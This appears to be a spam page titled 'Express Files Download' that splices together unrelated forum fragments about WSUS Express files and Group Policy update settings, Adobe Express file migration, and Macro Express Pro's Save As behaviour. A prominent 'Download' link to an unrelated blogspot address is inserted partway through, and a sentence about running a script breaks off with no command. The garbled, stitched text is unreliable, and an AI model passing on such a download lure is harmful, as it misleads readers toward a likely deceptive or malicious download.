# Express Files Download
  
I saw on another thread that I can possibly update a record to stop this message, but its my DB otherwise hosed? As far as I can tell, absolutely nothing was downloaded or changed in my content drive. No spikes in bandwidth and no change in storage.
 
Automatic Updates detection frequency: Enabled
Check for updates at the following interval (hours): 20
Allow Automatic Updates immediate installation: Enabled
Configure Automatic Updates: Enabled
Configure automatic updating: 4 - Auto download and schedule the install
 
**Download ———>>> [https://stupimoplanze.blogspot.com/?download=2A0Tbw](https://stupimoplanze.blogspot.com/?download=2A0Tbw)**


 
The following settings are only required and applicable if 4 is selected.
Install during automatic maintenance: Enabled
Scheduled install day: 0 - Every day
Scheduled install time: 16:00
Install updates for other Microsoft products: Disabled
Enable client-side targeting: Enabled
Target group name for this computer: Workstations
No auto-restart with logged on users for scheduled automatic updates installations: Disabled
Turn off auto-restart for updates during active hours: Enabled
Active Hours Start: 8 AM
Active Hours End: 6 PM
 
Computer Configuration > Policies > Administrative Templates > Windows Components > Windows Update
Allow Automatic Updates immediate installation: Enabled
Configure Automatic Updates: Enabled
Configure automatic updating: 3 - Auto download and notify for install
Enable client-side targeting: Enabled
Target group name for this computer: Servers
 
Computer Configuration > Policies > Administrative Templates > Windows Components > Windows Update
Enable client-side targeting: Enabled
Target group name for this computer: Servers; Test - Workstations
 
Computer Configuration > Policies > Administrative Templates > Windows Components > Windows Update
Enable client-side targeting: Enabled
Target group name for this computer: Servers; Test - Servers

Although the script is lengthy, it has been made to be super easy to setup and use. There are some prerequisites and instructions at the top of the script. After installing the prerequisites and configuring the variables for your environment, simply run:
 
Express files DO have their uses, and it depends in every situation whether to use them or not. You WILL see much less traffic going to your clients with it enabled, but the balance is that you take up about 5X the amount of space on the WSUS Server.
 
At the same token, going without Express files enabled, AND using WUDO (aka just Delivery Optimization) on the internal LAN, you can see just how much data is retrieved from others vs your WSUS Server (stats are in Settings > Windows Update > Advanced Options > Delivery Optimization > Activity Monitor.)
 
As we roll out the new version of Express, we obviously intend for files created in the previous version to be usable there as well. For some users (specifically, those we identified as never having used the mobile app), migration of the files should have happened automatically. For the remainder, files will have to be migrated manually. In either case, files should not be lost.
 

However, if you find your file missing in both locations, please log an issue using the Adobe Virtual Assistant at When you hit the link above, the team has direct access to your account and information and can help resolve.
 
hi Abhi, after a day of waiting, the (rather large) file downloaded. Is there a way i can edit and re use this? It's time consuming to start from scratch on some projects v/s quick fixes and updates that are needed.. hence the question, thanks!
 
Up until now I had all my macros in one large file called FULL.mex and I've never given much thought to where it was kept. But in an attempt to speed up various rather sluggish operations I've now transferred some of those macros into a few other MEX files. I used File > New and populated the files with a selection of macros.
 
But unlike ME 3, ME Pro has no File > Save As. Why is that please? So I used File > Close on each of my new MEX files. After restarting ME Pro, which automatically re-loaded FULL.mex, I used File > Open > Browse, expecting to see these new MEX files offered in the same folder as FULL.mex, **C:\Documents and Settings\All Users\Application Data\Insight Software Solutions\Macro Express Pro**. But no. A search showed that they had been saved in **C:\Program Files\Macro Express Pro**. I would never want to keep my user data in \Program Files (most of which is outside my 'backup area'). But I can't see a way of changing this path? Under Options > Preferences > File System, none of the 7 paths cover this.
 
Macro files are stored in the folder where you created them. We will look into the issue where they defaulted to c:\Program Files\Macro Express Pro. The default working folder should have been 'C:\Documents and Settings\All Users\Application Data\Insight Software Solutions\Macro Express Pro'.
 
Thanks Kevin. It seems ME Pro handles new files in a non-standard fashion. You must use Browse to specify the intended location when you **open** the empty file, instead of when you **save** it, unlike ME 3 and all other major applications I'm familiar with. No big deal once you realise, just unexpected!
 
I think a of of people try to manipulate their files form within the program with File > Save As and such. I see it a lot with Excel users trying to move copies from within Excel which inevitably creates duplicates. But really one should be using Windows Explorer for file manipulations.
 
If you create a new Access database you need to tell it where to put the file and what to name it. Some applications like Word open a template file (normal.dot) then protect you from overwriting it, hence a DOT extension instead of a DOC, but it's still a file saved in some obscure location on your hard disk. The only difference is when you are done writing your letter you do a Save As to save your changes to the template to a new location preserving the original file. I'll admit some simple applications like Notepad do keep it all in memory though but MEP is to sophisticated for that. The only difference is if you're being asked to specify before or after. But being asked before is not non-standard and lot of applications have you specify it before because it's requisite. I'll give you a good example. Say you want to call a macro from your new file from another file. How are you going to specify the MEX file path unless you have saved it somewhere?
 
Although I now see why **ME Pro** prefers to specify it at opening time, and agree with your other main points, **I can't at the moment think of any other of my major apps that ask me to specify a path first when I use File > New.** Word, Excel, PowerPoint, PaintShop Pro, TextPad, IrfanView, Movie Editor Pro, GPS Utility, FastStone Image Viewer, CircuitMaker, GoldWave, MemoriesOnTV, etc, etc. They all open an empty file immediately without requesting a path. You specify that later with a **File > Save As** or similar. Typically that's after you've added some content and so have a good idea how you want to use the file.
 
True most common programs do allow you to start from a template. I'll agree to that. But there are many real programs like Access that do. And I don't' think of it a non-standard as much as less common.
 
You keep taking about how all these application allow a start from scratch in a way to suggest that ME3 was like this and now MEP is not and I can't agree. In both ME3 and MEP one had to start a new macro file by specifying the location. So nothing is different in that regard unless I'm missing something.
 
And I see what you mean about ME3 having a SaveAS but I think it's better this way. Left to the average user they will try to move their MEX file this way when in actuality they are creating duplicates. So both ME3 and MEP require one to specify the location up front and from my perspective MEP is improved by removing the SaveAS. IOW you see it as a negative and I see it as a positive. But then again I'm the IT guy who hounds my users to use Windows Explorer to manipulate files instead of the SaveAS in an application. In more skilled hands it wouldn't be such a problem. Then again I create a lot of macro files and move them all over the place and I never noticed or missed the SaveAS. Different strokes for different folks.
 
Yes, you're right on that specific. (I didn't spot that before my first post.) But the two key differences from ME 3 to my mind are: the missing Save As and the changed default location (to \Program Files, the last place I want my data).
 
Save As: On the other hand a Save As would be nice if one wanted to create a copy. I mean if I had a template macro for sample and wanted to "Save As" so I could upload here would be nice. Yeah, maybe it wouldn't hurt to have it in here.
 
Default location: I wonder if there might be something wrong with your Save As when you create a new macro. Mine defaults to the last folder I used, not the Program File folder. Right now as I try it the dialog defaults to the macro directory of the last client I worked on which seems most sensible. Perhaps there's something awry with your settings. I know in other applications when they get confused they tend to go home to mommy.
 
To access your old files, you can go to "Your Stuff", and there is a highlighted option that says, "Looking for files created with the prior version of Adobe Express or mobile app? We got you." Click on "Access files," you can find your old files there and move them to the new desktop version.
 a2f82b0cb4
 
